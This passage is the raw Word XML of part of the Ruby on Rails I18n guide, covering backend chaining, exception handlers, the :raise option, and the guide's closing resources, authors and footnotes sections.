      <w:r>
        <w:t>You can also use the Chain backend to chain multiple backends together. This is useful when you want to use standard translations with a Simple backend but store custom application translations in a database or other backends. For example, you could use the Active Record backend and fall back to the (default) Simple backend:</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24B9D89C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0AE23FE5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="571627421"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.backend = I18n::Backend::Chain.new(I18n::Backend::ActiveRecord.new, I18n.backend)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="08B796CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 Using Different Exception Handlers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06208D1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defines the following exceptions that will be raised by backends when the corresponding unexpected conditions occur:</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E776F9E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29D26130" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MissingTranslationData       # no translation was found for the requested key</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06E72524" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>InvalidLocale                # the locale set to I18n.locale is invalid (e.g. nil)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C887A1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>InvalidPluralizationData     # a count option was passed but the translation data is not suitable for pluralization</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AC1B8E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MissingInterpolationArgument # the translation expects an interpolation argument that has not been passed</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04DF2DE5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ReservedInterpolationKey     # the translation contains a reserved interpolation variable name (i.e. one of: scope, default)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00F0519C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>UnknownFileType              # the backend does not know how to handle a file type that was added to I18n.load_path</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6701BEBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will catch all of these exceptions when they are thrown in the backend and pass them to the default_exception_handler method. This method will re-raise all exceptions except for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>MissingTranslationData</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exceptions. When a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>MissingTranslationData</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception has been caught, it will return the exception’s error message string containing the missing key/scope.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FF42CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The reason for this is that during development you’d usually want your views to still render even though a translation is missing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B25E16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In other contexts you might want to change this behaviour, though. E.g. the default exception handling does not allow to catch missing translations during automated tests easily. For this purpose a different exception handler can be specified. The specified exception handler must be a method on the I18n module:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="27A2A97A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6CD01A87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06969127" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.just_raise_that_exception(*args)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="594B2C0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>args.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33E5F957" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="189B59CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AD09CC3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="501A9A6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.exception_handler = :just_raise_that_exception</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="264C8669" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This would re-raise all caught exceptions including </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>MissingTranslationData</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CD42DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another example where the default behaviour is less desirable is the Rails TranslationHelper which provides the method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (as well as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#translate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). When a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>MissingTranslationData</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception occurs in this context, the helper wraps the message into a span with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>translation_missing</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8ACE29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To do so, the helper forces </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n#translate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to raise exceptions no matter what exception handler is defined by setting the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:raise</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</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E87BC7B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1113C560" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1428423661"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :foo, :raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># always re-raises exceptions from the backend</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="785694E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>7 Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9B09B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>At this point you should have a good overview about how I18n support in Ruby on Rails works and are ready to start translating your project.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D0299D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you find anything missing or wrong in this guide, please file a ticket on our </w:t>
      </w:r>
      <w:hyperlink r:id="rId570" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>issue tracker</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. If you want to discuss certain portions or have questions, please sign up to our </w:t>
      </w:r>
      <w:hyperlink r:id="rId571" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>mailing list</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D9431B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>8 Contributing to Rails I18n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F018D5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>I18n support in Ruby on Rails was introduced in the release 2.2 and is still evolving. The project follows the good Ruby on Rails development tradition of evolving solutions in plugins and real applications first, and only then cherry-picking the best-of-breed of most widely useful features for inclusion in the core.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F57BCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Thus we encourage everybody to experiment with new ideas and features in plugins or other libraries and make them available to the community. (Don’t forget to announce your work on our </w:t>
      </w:r>
      <w:hyperlink r:id="rId572" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>mailing list</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>!)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249B017A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you find your own locale (language) missing from our </w:t>
      </w:r>
      <w:hyperlink r:id="rId573" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>example translations data</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> repository for Ruby on Rails, please </w:t>
      </w:r>
      <w:hyperlink r:id="rId574" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a7"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>fork</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> the repository, add your data and send a </w:t>
      </w:r>
      <w:hyperlink r:id="rId575" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>pull request</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699459EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>9 Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4A79D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="306"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId576" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>rails-i18n.org</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> – Homepage of the rails-i18n project. You can find lots of useful resources on the </w:t>
      </w:r>
      <w:hyperlink r:id="rId577" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>wiki</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73311567" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="306"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId578" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Google group: rails-i18n</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> – The project’s mailing list.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0F0AA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="306"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId579" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Github: rails-i18n</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> – Code repository for the rails-i18n project. Most importantly you can find lots of </w:t>
      </w:r>
      <w:hyperlink r:id="rId580" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>example translations</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> for Rails that should work for your application in most cases.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05177FDC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="306"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId581" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Github: i18n</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> – Code repository for the i18n gem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7190C554" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="306"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId582" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Lighthouse: rails-i18n</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> – Issue tracker for the rails-i18n project.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EF2060" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="306"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId583" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Lighthouse: i18n</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> – Issue tracker for the i18n gem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B9DC44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>10 Authors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0643EAEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="307"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId584" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Sven Fuchs</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> (initial author)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76987836" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="307"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId585" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Karel Minařík</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5248A1F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you found this guide useful, please consider recommending its authors on </w:t>
      </w:r>
      <w:hyperlink r:id="rId586" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>workingwithrails</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477A1509" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>11 Footnotes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3185DCBA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="footnote"/>
      </w:pPr>
      <w:hyperlink r:id="rId587" w:anchor="fnr1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:vertAlign w:val="superscript"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> Or, to quote </w:t>
      </w:r>
      <w:hyperlink r:id="rId588" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Wikipedia</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="009A002D">
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>“Internationalization is the process of designing a software application so that it can be adapted to various languages and regions without engineering changes. Localization is the process of adapting software for a specific region or language by adding locale-specific components and translating text.”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777198F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="footnote"/>
      </w:pPr>
      <w:hyperlink r:id="rId589" w:anchor="fnr2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:vertAlign w:val="superscript"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> Other backends might allow or require to use other formats, e.g. a GetText backend might allow to read GetText files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C065448" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="footnote"/>
      </w:pPr>
      <w:hyperlink r:id="rId590" w:anchor="fnr3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:vertAlign w:val="superscript"/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> One of these reasons is that we don’t want to imply any unnecessary load for applications that do not need any I18n capabilities, so we need to keep the I18n library as simple as possible for English. Another reason is that it is virtually impossible to implement a one-fits-all solution for all problems related to I18n for all existing languages. So a solution that allows us to exchange the entire implementation easily is appropriate anyway. This also makes it much easier to experiment with custom features and extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DC4776" w14:textId="00D9F03B" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.3、</w:t>
      </w:r>
      <w:hyperlink r:id="rId591" w:history="1">
